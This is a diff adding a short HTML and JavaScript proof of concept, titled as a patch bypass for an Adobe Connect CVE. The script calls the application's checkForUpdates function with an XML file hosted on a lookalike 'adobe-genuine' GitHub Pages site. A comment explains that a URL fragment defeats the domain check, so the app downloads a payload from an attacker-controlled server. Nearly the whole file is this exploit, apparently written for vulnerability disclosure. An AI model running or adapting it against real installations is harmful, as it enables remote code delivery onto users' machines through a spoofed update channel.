@@ -1,0 +1,24 @@
+<html><body>
+<div id="o"></div>
+<script>
+var o = document.getElementById('o');
+function log(m) { o.innerHTML += m + '<br>'; }
+
+log('Adobe Connect Patch Bypass PoC - CVE-2026-34659');
+log('---');
+
+// Fragment bypass: download.adobe.com is in fragment (passes string check)
+// but NSURL resolves host to our GitHub Pages server
+var xmlUrl = 'https://adobe-genuine.github.io/connect-poc/exploit.xml?nc=' + Date.now();
+log('Triggering checkForUpdates with exploit XML...');
+log('XML URL: ' + xmlUrl);
+
+try {
+    connectApp.checkForUpdates(xmlUrl, false, true);
+    log('checkForUpdates called successfully');
+    log('App should download payload from attacker-controlled URL...');
+} catch(e) {
+    log('ERROR: ' + e.message);
+}
+</script>
+</body></html>
